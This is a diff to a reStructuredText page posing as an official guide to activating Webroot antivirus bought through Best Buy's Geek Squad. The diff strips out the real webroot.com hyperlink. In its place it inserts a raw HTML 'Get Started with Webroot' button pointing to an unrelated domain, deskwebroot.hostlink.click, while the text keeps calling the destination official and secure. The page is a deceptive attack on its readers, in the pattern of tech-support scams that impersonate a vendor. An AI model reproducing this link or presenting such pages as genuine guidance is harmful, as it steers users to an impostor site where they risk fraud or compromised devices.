@@ -1,9 +1,14 @@
 webroot.com/geeksquadactivate | Webroot Geek Squad Activate Subscription
 =========================================================================
 
-If you've recently purchased Webroot antivirus protection via Best Buy's Geek Squad, the next critical step is activation. To secure your device, you'll need to visit `webroot.com/geeksquadactivate <https://www.webroot.com/geeksquadactivate>`_. This is the official page where you can download and activate your subscription with ease.
+If you've recently purchased Webroot antivirus protection via Best Buy's Geek Squad, the next critical step is activation. To secure your device, you'll need to visit webroot.com/geeksquadactivate. This is the official page where you can download and activate your subscription with ease.
 
-Using `webroot.com/geeksquadactivate` ensures you're accessing a secure, verified Webroot installer that is tied directly to your Geek Squad license. Whether you're protecting your personal laptop, family desktop, or multiple devices across your household, the `webroot.com/geeksquadactivate` portal provides a seamless way to set up the powerful Webroot SecureAnywhere antivirus software.
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
+Using webroot.com/geeksquadactivate ensures you're accessing a secure, verified Webroot installer that is tied directly to your Geek Squad license. Whether you're protecting your personal laptop, family desktop, or multiple devices across your household, the `webroot.com/geeksquadactivate` portal provides a seamless way to set up the powerful Webroot SecureAnywhere antivirus software.
 
 In this guide, we’ll walk you through how to use `webroot.com/geeksquadactivate` to complete your **Webroot Geek Squad activate subscription** process, download the software, and begin protecting your digital life within minutes.
 
